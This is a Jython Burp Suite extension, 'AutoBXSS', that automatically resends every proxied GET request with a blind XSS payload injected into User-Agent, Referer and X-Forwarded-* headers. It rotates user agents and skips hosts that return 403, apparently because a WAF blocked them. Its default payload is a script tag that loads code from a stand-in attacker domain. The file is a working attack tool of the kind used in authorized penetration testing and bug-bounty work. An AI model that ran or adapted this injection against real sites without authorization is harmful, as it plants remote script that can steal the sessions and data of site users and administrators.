# -*- coding: utf-8 -*-
#
# AutoBXSS - An Auto Blind XSS Prober
#
# This extension passively probes for Blind XSS by injecting a user-defined
# payload into various HTTP headers for new GET requests processed by Burp.
# It saves the payload configuration automatically.
#

from burp import IBurpExtender, IScannerCheck, ITab
from java.awt import BorderLayout, Dimension
from javax.swing import (
    JPanel, JLabel, JTextField, JScrollPane, JTextArea, BoxLayout, Box, BorderFactory
)
from javax.swing.event import DocumentListener
from java.lang import String
import random

class BurpExtender(IBurpExtender, IScannerCheck, ITab):
    """
    Main class for the AutoBXSS extension.
    """

    def registerExtenderCallbacks(self, callbacks):
        """
        Set up the extension.
        """
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("AutoBXSS")

        # Set of hosts that have blocked our probes (returned 403)
        self.skip_list = set()
        
        # A list of common User-Agents to choose from
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
        ]

        # Create the UI
        self._create_gui()

        # Load the saved payload from Burp's settings
        self._load_saved_payload()

        # Add the custom tab to Burp's UI
        self._callbacks.addSuiteTab(self)

        # Register the extension as a passive scanner check
        self._callbacks.registerScannerCheck(self)

        print "[+] AutoBXSS extension loaded successfully."
        print "[+] Go to the 'AutoBXSS' tab to set your payload."

    #
    # Implement ITab
    #

    def getTabCaption(self):
        """
        Return the name of the custom tab.
        """
        return "AutoBXSS"

    def getUiComponent(self):
        """
        Return the component that should be displayed on the custom tab.
        """
        return self.main_panel

    #
    # Implement IScannerCheck
    #

    def doPassiveScan(self, baseRequestResponse):
        """
        This method is called for new requests/responses passed to the scanner.
        It handles both sitemap additions and manual passive scan triggers.
        """
        # Get the host and check if it's in our skip list
        httpService = baseRequestResponse.getHttpService()
        host = httpService.getHost()

        if host in self.skip_list:
            print "[-] Host {} is in the skip list. Skipping.".format(host)
            return None

        # Analyze the original request to filter it
        requestInfo = self._helpers.analyzeRequest(baseRequestResponse)

        # 1. Ensure it's a GET request
        if requestInfo.getMethod() != "GET":
            return None

        # 2. Ensure the response is not a 40x
        responseBytes = baseRequestResponse.getResponse()
        if responseBytes is None:
            return None
        
        responseInfo = self._helpers.analyzeResponse(responseBytes)
        statusCode = responseInfo.getStatusCode()

        if 400 <= statusCode < 500:
            print "[-] Original request to {} has status {}. Skipping.".format(host, statusCode)
            return None

        # Get the payload from the UI
        payload = self.payload_field.getText()
        if not payload:
            # Silently return if no payload is configured
            return None

        print "[+] Probing {} with Blind XSS payload...".format(host)

        # Get the original headers and body
        original_headers = list(requestInfo.getHeaders())
        request_body_bytes = baseRequestResponse.getRequest()[requestInfo.getBodyOffset():]

        # Build a new set of headers with the payload injected
        new_headers, headers_found = self._inject_payload_into_headers(original_headers, payload, host)

        # Build the new HTTP request
        modified_request_bytes = self._helpers.buildHttpMessage(new_headers, request_body_bytes)

        # Send the modified request
        checkRequestResponse = None
        try:
            checkRequestResponse = self._callbacks.makeHttpRequest(
                httpService, modified_request_bytes
            )
        except Exception as e:
            print "[-] Error sending modified request to {}: {}".format(host, e)
            return None

        if checkRequestResponse is None or checkRequestResponse.getResponse() is None:
            print "[-] No response received for modified request to {}".format(host)
            return None

        # Analyze the response to our modified request
        modified_response_info = self._helpers.analyzeResponse(checkRequestResponse.getResponse())
        modified_status_code = modified_response_info.getStatusCode()

        print "[*] Sent payload to {}. Probe response status: {}".format(host, modified_status_code)

        # 4. If we get blocked (403), add the host to the skip list
        if modified_status_code == 403:
            print "[!] Host {} returned 403. Likely blocked by WAF. Adding to skip list.".format(host)
            self.skip_list.add(host)
            # Update the UI with the new host in the skip list
            self.skip_list_area.setText("\n".join(sorted(list(self.skip_list))))

        # This is a prober, not an issue reporter, so we return None
        return None

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        """
        This method is called when multiple issues are reported for the same URL.
        We report all distinct issues, so we return -1.
        """
        return -1

    #
    # Helper methods
    #

    def _create_gui(self):
        """
        Create the Swing GUI for the custom tab with improved layout.
        """
        # Main container with a border layout and padding
        self.main_panel = JPanel(BorderLayout(10, 10))
        self.main_panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        # --- Top Panel for Payload Input ---
        payload_panel = JPanel()
        payload_panel.setLayout(BoxLayout(payload_panel, BoxLayout.X_AXIS))
        
        payload_label = JLabel("BXSS Payload: ")
        self.payload_field = JTextField('<script src="https://your.domain.com"></script>', 50)
        
        # Add a document listener to save the payload whenever it changes
        self.payload_field.getDocument().addDocumentListener(self.PayloadListener(self))

        # Constrain the height of the text field to its preferred size
        pref_height = self.payload_field.getPreferredSize().height
        self.payload_field.setMaximumSize(Dimension(self.payload_field.getMaximumSize().width, pref_height))

        payload_panel.add(payload_label)
        payload_panel.add(Box.createHorizontalStrut(5))
        payload_panel.add(self.payload_field)

        # --- Skip List Panel ---
        skip_list_panel = JPanel(BorderLayout(0, 5))
        skip_list_label = JLabel("Skip List (Hosts that blocked probes with a 403):")
        
        self.skip_list_area = JTextArea()
        self.skip_list_area.setEditable(False)
        scroll_pane = JScrollPane(self.skip_list_area)

        skip_list_panel.add(skip_list_label, BorderLayout.NORTH)
        skip_list_panel.add(scroll_pane, BorderLayout.CENTER)

        # --- Assembling the Main Panel ---
        self.main_panel.add(payload_panel, BorderLayout.NORTH)
        self.main_panel.add(skip_list_panel, BorderLayout.CENTER)

    def _load_saved_payload(self):
        """
        Loads the payload from Burp's extension settings and sets it in the text field.
        """
        saved_payload = self._callbacks.loadExtensionSetting("autobxss_payload")
        if saved_payload is not None:
            self.payload_field.setText(saved_payload)
            print "[+] Loaded saved payload."

    def _inject_payload_into_headers(self, original_headers, payload, host):
        """
        Takes a list of headers and returns a new list with the payload
        injected into the target headers.
        """
        new_headers = []
        headers_found = {
            "User-Agent": False, "Referer": False, "X-Forwarded-For": False,
            "X-Forwarded-Host": False, "X-Forwarded-Ip": False
        }

        for header in original_headers:
            header_name = header.split(":", 1)[0]
            found_key = next((k for k in headers_found if k.lower() == header_name.lower()), None)
            
            if found_key:
                new_headers.append(header + payload)
                headers_found[found_key] = True
            else:
                new_headers.append(header)
        
        if not headers_found["User-Agent"]:
            new_headers.append("User-Agent: {}".format(self._get_random_user_agent() + payload))
        if not headers_found["Referer"]:
            new_headers.append("Referer: {}".format(self._get_random_referer(host) + payload))
        if not headers_found["X-Forwarded-For"]:
            new_headers.append("X-Forwarded-For: {}".format(payload))
        if not headers_found["X-Forwarded-Host"]:
            new_headers.append("X-Forwarded-Host: {}".format(payload))
        if not headers_found["X-Forwarded-Ip"]:
            new_headers.append("X-Forwarded-Ip: {}".format(payload))

        return new_headers, headers_found

    def _get_random_user_agent(self):
        return random.choice(self.user_agents)

    def _get_random_referer(self, host):
        return "https://www.google.com/search?q={}".format(host)

    # Inner class to handle text field changes for saving the payload
    class PayloadListener(DocumentListener):
        def __init__(self, extender):
            self.extender = extender

        def save_payload(self, e):
            payload = self.extender.payload_field.getText()
            # Use java.lang.String to avoid Jython encoding issues
            self.extender._callbacks.saveExtensionSetting("autobxss_payload", String(payload))

        def insertUpdate(self, e):
            self.save_payload(e)

        def removeUpdate(self, e):
            self.save_payload(e)

        def changedUpdate(self, e):
            self.save_payload(e)